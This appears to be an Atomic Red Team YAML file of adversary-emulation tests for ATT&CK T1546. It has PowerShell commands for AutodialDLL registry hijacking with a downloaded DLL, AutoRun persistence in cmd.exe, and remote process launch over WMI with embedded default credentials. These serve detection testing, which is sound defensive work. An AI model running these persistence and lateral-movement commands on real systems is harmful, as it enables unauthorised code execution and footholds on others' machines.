attack_technique: T1546
display_name: Event Triggered Execution
atomic_tests:
    - name: Persistence with Custom AutodialDLL
      item_id: T1546-1
      auto_generated_guid: aca9ae16-7425-4b6d-8c30-cad306fdbd5b
      description: "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n"
      supported_platforms:
        - windows
      input_arguments: {}
      dependency_executor_name: ""
      dependencies:
        - description: |
            AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
          prereq_command: |
            if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll) { exit 0} else { exit 1}
          get_prereq_command: |
            New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction ignore | Out-Null
            Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"
      executor:
        command: |
            Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
        cleanup_command: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
        name: powershell
        elevation_required: true
    - name: HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
      item_id: T1546-2
      auto_generated_guid: a574dafe-a903-4cce-9701-14040f4f3532
      description: |-
        An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.
        [reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)
      supported_platforms:
        - windows
      input_arguments:
        command:
            description: Command to Execute
            type: string
            default: notepad.exe
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "#{command}" -PropertyType "String"
        cleanup_command: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
        name: powershell
        elevation_required: true
    - name: HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
      item_id: T1546-3
      auto_generated_guid: 36b8dbf9-59b1-4e9b-a3bb-36e80563ef01
      description: |-
        An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.
        [reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)
      supported_platforms:
        - windows
      input_arguments:
        command:
            description: Command to Execute
            type: string
            default: notepad.exe
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: |-
            $path = "HKCU:\Software\Microsoft\Command Processor"
            if (!(Test-Path -path $path)){
              New-Item -ItemType Key -Path $path
            }
            New-ItemProperty -Path $path -Name "AutoRun" -Value "#{command}" -PropertyType "String"
        cleanup_command: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
        name: powershell
        elevation_required: false
    - name: WMI Invoke-CimMethod Start Process
      item_id: T1546-4
      auto_generated_guid: adae83d3-0df6-45e7-b2c3-575f91584577
      description: |
        The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.
        This is a novel way to perform lateral movement or to start a remote process.
        This does require WinRM to be enabled. The account performing the run will also need to be elevated.
        A successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.
      supported_platforms:
        - windows
      input_arguments:
        dest:
            description: destination computer name
            type: string
            default: localhost
        password:
            description: password for account
            type: string
            default: P@ssword1
        process:
            description: process to spawn
            type: string
            default: calc.exe
        username:
            description: account to use
            type: string
            default: Administrator
      dependency_executor_name: ""
      dependencies: []
      executor:
        command: "# Set the remote computer name and credentials\n $RemoteComputer = \"#{dest}\"\n $PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"#{process}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n"
        cleanup_command: ""
        name: powershell
        elevation_required: true
